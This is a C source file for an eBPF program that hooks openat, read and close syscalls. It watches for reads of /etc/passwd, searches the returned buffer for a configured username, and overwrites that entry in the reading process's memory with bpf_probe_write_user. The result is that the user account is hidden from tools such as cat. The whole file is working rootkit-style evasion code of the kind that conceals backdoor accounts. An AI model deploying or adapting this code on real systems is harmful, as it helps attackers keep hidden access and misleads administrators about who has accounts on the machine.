// SPDX-License-Identifier: BSD-3-Clause
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "common.h"

char LICENSE[] SEC("license") = "Dual BSD/GPL";

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, unsigned int);
} map_fds SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_buff_addrs SEC(".maps");

// Map to fold the buffer sized from 'read' calls
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, MAX_POSSIBLE_ADDRS);
    __type(key, unsigned int);
    __type(value, long unsigned int);
} map_name_addrs SEC(".maps");
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, MAX_POSSIBLE_ADDRS);
    __type(key, unsigned int);
    __type(value, long unsigned int);
} map_to_replace_addrs SEC(".maps");

// Map holding the programs for tail calls
struct {
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 5);
    __type(key, __u32);
    __type(value, __u32);
} map_prog_array SEC(".maps");


// Optional Target Parent PID
const volatile int target_ppid = 0;

// The UserID of the user, if we're restricting
// running to just this user
const volatile int uid = 0;

#define MAX_PAYLOAD_LEN 100
#define MAX_USERNAME_LEN 20
const int max_payload_len = 64;
const volatile int username_len = 0;
const volatile char username[MAX_PAYLOAD_LEN];

// Const length of string "cat"
#define USER_LEN 4

// Const length of string "/etc/passwd"
#define PASSWD_LEN 12

SEC("tp/syscalls/sys_enter_openat")
int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;

    // Check if we're a process thread of interest
    if (target_ppid != 0) {
        struct task_struct *task = (struct task_struct *)bpf_get_current_task();
        int ppid = BPF_CORE_READ(task, real_parent, tgid);
        if (ppid != target_ppid) {
            return 0;
        }
    }

    // check comm is cat
    /*
    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(comm, sizeof(comm));
    const char *user = "cat";
    for (int i = 0; i < USER_LEN; i++) {
        if (comm[i] != user[i]) {
            //return 0;
        }
    }*/

    // Now check we're opening /etc/passwd
    const char *passwd = "/etc/passwd";
    char filename[PASSWD_LEN];
    bpf_probe_read_user(&filename, PASSWD_LEN, (char*)ctx->args[1]);
    for (int i = 0; i < PASSWD_LEN; i++) {
        if (filename[i] != passwd[i]) {
            return 0;
        }
    }
    bpf_printk("Hiding user %s\n", filename);

    // If filtering by UID check that
    if (uid != 0) {
        int current_uid = bpf_get_current_uid_gid() >> 32;
        if (uid != current_uid) {
            return 0;
        }
    }

    // Add pid_tgid to map for our sys_exit call
    unsigned int zero = 0;
    bpf_map_update_elem(&map_fds, &pid_tgid, &zero, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_exit_openat")
int handle_openat_exit(struct trace_event_raw_sys_exit *ctx)
{
    // Check this open call is reading our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    unsigned int* pfd = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (pfd == 0) {
        return 0;
    }
    int pid = pid_tgid >> 32;

    unsigned int fd = (unsigned int)ctx->ret;
    bpf_map_update_elem(&map_fds, &pid_tgid, &fd, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_enter_read")
int handle_read_enter(struct trace_event_raw_sys_enter *ctx)
{
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    unsigned int* pfd = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (pfd == 0) {
        return 0;
    }

    unsigned int map_fd = *pfd;
    unsigned int fd = (unsigned int)ctx->args[0];
    if (map_fd != fd) {
        return 0;
    }

    // Store buffer address from arguments in map
    long unsigned int buff_addr = ctx->args[1];
    bpf_map_update_elem(&map_buff_addrs, &pid_tgid, &buff_addr, BPF_ANY);

    // log and exit
    size_t buff_size = (size_t)ctx->args[2];
    return 0;
}


SEC("tp/syscalls/sys_exit_read")
int find_possible_addrs(struct trace_event_raw_sys_exit *ctx)
{
    // Check this open call is reading our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }
    int pid = pid_tgid >> 32;
    long unsigned int buff_addr = *pbuff_addr;
    long unsigned int name_addr = 0;
    if (buff_addr <= 0) {
        return 0;
    }

    // This is amount of data returned from the read syscall
    if (ctx->ret <= 0) {
        return 0;
    }
    long unsigned int read_size = ctx->ret;

    char local_buff[LOCAL_BUFF_SIZE] = { 0x00 };

    if (read_size > (LOCAL_BUFF_SIZE+1)) {
        // Need to loop :-(
        read_size = LOCAL_BUFF_SIZE;
    }

    unsigned int tofind_counter = 0;
    for (unsigned int i = 0; i < LOCAL_BUFF_SIZE; i++) {
        // Read in chunks from buffer
        bpf_probe_read(&local_buff, read_size, (void*)buff_addr);
        for (unsigned int j = 0; j < LOCAL_BUFF_SIZE; j++) {
            // Look for the first char of our 'to find' text
            if (local_buff[j] == username[0]) {
                name_addr = buff_addr+j;
                // This is possibly out text, add the address to the map to be
                // checked by program 'check_possible_addrs'
                bpf_map_update_elem(&map_name_addrs, &tofind_counter, &name_addr, BPF_ANY);
                tofind_counter++;
            }
        }

        buff_addr += LOCAL_BUFF_SIZE;
    }

    // Tail-call into 'check_possible_addrs' to loop over possible addresses
    
    bpf_tail_call(ctx, &map_prog_array, PROG_01);
    return 0;
}

SEC("tp/syscalls/sys_exit_read")
int check_possible_addresses(struct trace_event_raw_sys_exit *ctx) {
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }
    int pid = pid_tgid >> 32;
    long unsigned int* pName_addr = 0;
    long unsigned int name_addr = 0;
    unsigned int newline_counter = 0;
    unsigned int match_counter = 0;

    char name[TEXT_LEN_MAX+1];
    unsigned int j = 0;
    char old = 0;
    const unsigned int name_len = username_len;
    if (name_len < 0) {
        return 0;
    }
    if (name_len > TEXT_LEN_MAX) {
        return 0;
    }
    // Go over every possibly location
    // and check if it really does match our text
    for (unsigned int i = 0; i < MAX_POSSIBLE_ADDRS; i++) {
        newline_counter = i;
        pName_addr = bpf_map_lookup_elem(&map_name_addrs, &newline_counter);
        if (pName_addr == 0) {
            break;
        }
        name_addr = *pName_addr;
        if (name_addr == 0) {
            break;
        }
        bpf_probe_read_user(&name, TEXT_LEN_MAX, (char*)name_addr);
        for (j = 0; j < TEXT_LEN_MAX; j++) {
            if (name[j] != username[j]) {
                break;
            }
        }
        if (j >= name_len) {
            bpf_map_update_elem(&map_to_replace_addrs, &match_counter, &name_addr, BPF_ANY);
            match_counter++;
        }
        bpf_map_delete_elem(&map_name_addrs, &newline_counter);
    }

    // If we found at least one match, jump into program to overwrite text
    if (match_counter > 0) {
        bpf_tail_call(ctx, &map_prog_array, PROG_02);
    }
    return 0;
}

SEC("tp/syscalls/sys_exit_read")
int delete_addresses(struct trace_event_raw_sys_exit *ctx) {
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }
    int pid = pid_tgid >> 32;
    long unsigned int* pName_addr = 0;
    long unsigned int name_addr = 0;
    unsigned int match_counter = 0;
    char local_buff[MAX_PAYLOAD_LEN] = { 0x00 };
    char delete_buff[MAX_PAYLOAD_LEN] = { 0x00 };

    // Loop over every address to replace text into
    match_counter = 0;
    pName_addr = bpf_map_lookup_elem(&map_to_replace_addrs, &match_counter);
    if (pName_addr == 0) {
        return 0;
    }
    name_addr = *pName_addr;
    if (name_addr == 0) {
        return 0;
    }

    // Attempt to overwrite data with out replace string (minus the end null bytes)
    
    int length = 0;

    bpf_probe_read(&delete_buff, MAX_PAYLOAD_LEN, (void*)name_addr);

    for(int i = 0; i < MAX_PAYLOAD_LEN; i++){
        if(delete_buff[i] == '\n'){
            break;
        }
        length++;
    }
    length++;
    bpf_printk("length: %d\n", length);

    long ret = bpf_probe_write_user((void*)name_addr, (void*)local_buff, length);
    // Send event
    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
    if (e) {
        e->success = (ret == 0);
        e->pid = pid;
        bpf_get_current_comm(&e->comm, sizeof(e->comm));
        bpf_ringbuf_submit(e, 0);
    }
        
    // Clean up map now we're done
    bpf_map_delete_elem(&map_to_replace_addrs, &match_counter);

    return 0;
}


SEC("tp/syscalls/sys_exit_close")
int handle_close_exit(struct trace_event_raw_sys_exit *ctx)
{
    // Check if we're a process thread of interest
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    unsigned int* check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (check == 0) {
        return 0;
    }

    // Closing file, delete fd from all maps to clean up
    bpf_map_delete_elem(&map_fds, &pid_tgid);
    bpf_map_delete_elem(&map_buff_addrs, &pid_tgid);

    return 0;
}